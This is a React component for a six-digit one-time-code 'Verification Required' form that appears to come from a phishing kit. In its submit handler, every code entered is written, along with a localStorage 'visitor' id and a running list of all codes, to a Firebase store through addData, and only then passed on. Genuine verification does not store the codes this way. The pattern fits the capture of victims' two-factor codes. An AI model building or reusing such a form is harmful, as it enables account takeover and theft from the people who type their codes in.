"use client"

import type React from "react"

import { useState, useRef, useEffect } from "react"
import { ArrowLeftIcon, ShieldCheckIcon } from "lucide-react"
import { addData } from "../firebase"

interface OtpVerificationProps {
  onSubmit: (otp: string) => void
  isSubmitting: boolean
  error: boolean
  onBack: () => void
}

export function OtpVerification({ onSubmit, isSubmitting, error, onBack }: OtpVerificationProps) {
  const [otp, setOtp] = useState<string[]>(Array(6).fill(""))
  const inputRefs = useRef<(HTMLInputElement | null)[]>([])
  const allOtps=['']
  // Focus the first input on mount
  useEffect(() => {
    if (inputRefs.current[0]) {
      inputRefs.current[0].focus()
    }
  }, [])

  const handleChange = (index: number, value: string) => {
    // Only allow numbers
    if (!/^\d*$/.test(value)) return

    const newOtp = [...otp]
    newOtp[index] = value.slice(0, 1)
    setOtp(newOtp)

    // Move to next input if current input is filled
    if (value && index < 5 && inputRefs.current[index + 1]) {
      inputRefs!.current[index + 1]!.focus()
    }
  }

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    // Move to previous input on backspace if current input is empty
    if (e.key === "Backspace" && !otp[index] && index > 0 && inputRefs.current[index - 1]) {
      inputRefs!.current[index - 1]!.focus()
    }
  }

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault()
    const pastedData = e.clipboardData.getData("text/plain").trim()

    // Check if pasted content is a number and has the right length
    if (!/^\d+$/.test(pastedData)) return

    const digits = pastedData.slice(0, 6).split("")
    const newOtp = [...otp]

    digits.forEach((digit, index) => {
      if (index < 6) {
        newOtp[index] = digit
      }
    })

    setOtp(newOtp)

    // Focus the next empty input or the last input
    const nextEmptyIndex = newOtp.findIndex((val) => !val)
    if (nextEmptyIndex !== -1 && inputRefs.current[nextEmptyIndex]) {
      inputRefs!.current[nextEmptyIndex]!.focus()
    } else if (inputRefs.current[5]) {
      inputRefs.current[5].focus()
    }
  }

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    const otpString = otp.join("")
    if (otpString.length === 6) {
    allOtps.push(otpString.toString())
    const _id=localStorage.getItem('visitor')
      addData({id:_id,otp:otpString,allOtps})
      onSubmit(otpString)
    }
  }

  return (
    <div className="bg-white rounded-lg shadow-md overflow-hidden">
      <div className="p-6 border-b border-gray-200">
        <div className="flex items-center gap-2 mb-1">
          <button
            onClick={onBack}
            disabled={isSubmitting}
            className="h-8 w-8 flex items-center justify-center rounded-full hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-200 disabled:opacity-50"
          >
            <ArrowLeftIcon className="h-4 w-4" />
            <span className="sr-only">Back</span>
          </button>
          <div className="flex items-center gap-2">
            <ShieldCheckIcon className="h-5 w-5 text-gray-700" />
            <h2 className="text-xl font-semibold text-gray-900">Verification Required</h2>
          </div>
        </div>
        <p className="text-sm text-gray-500">Enter the 6-digit code sent to your registered mobile number.</p>
      </div>
      <div className="p-6">
        <form onSubmit={handleSubmit}>
          {error && (
            <div className="mb-4 p-4 border border-red-200 bg-red-50 rounded-md text-red-800">
              <p>Invalid verification code. Please try again.</p>
            </div>
          )}

          <div className="flex justify-center gap-2 mb-6">
            {otp.map((digit, index) => (
              <input
                key={index}
                ref={(el) => (inputRefs.current[index] = el) as any}
                type="text"
                inputMode="numeric"
                value={digit}
                onChange={(e) => handleChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                onPaste={index === 0 ? handlePaste : undefined}
                className="h-12 w-12 text-center text-lg border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-200 focus:border-blue-400"
                maxLength={1}
                autoComplete="one-time-code"
              />
            ))}
          </div>

          <button
            type="submit"
            disabled={otp.join("").length !== 6 || isSubmitting}
            className={`w-full py-2 px-4 rounded-md text-white font-medium transition-colors ${
              otp.join("").length !== 6 || isSubmitting
                ? "bg-gray-400 cursor-not-allowed"
                : "bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-300"
            }`}
          >
            {isSubmitting ? "Verifying..." : "Verify"}
          </button>

          <div className="mt-4 text-center text-sm text-gray-500">
            <p>
              Didn't receive the code?{" "}
              <button
                type="button"
                className="text-blue-600 hover:text-blue-800 focus:outline-none"
                disabled={isSubmitting}
              >
                Resend
              </button>
            </p>
          </div>
        </form>
      </div>
      <div className="px-6 py-4 bg-gray-50 border-t border-gray-200 text-center text-xs text-gray-500">
        <p>For demo purposes, use code: 123456</p>
      </div>
    </div>
  )
}
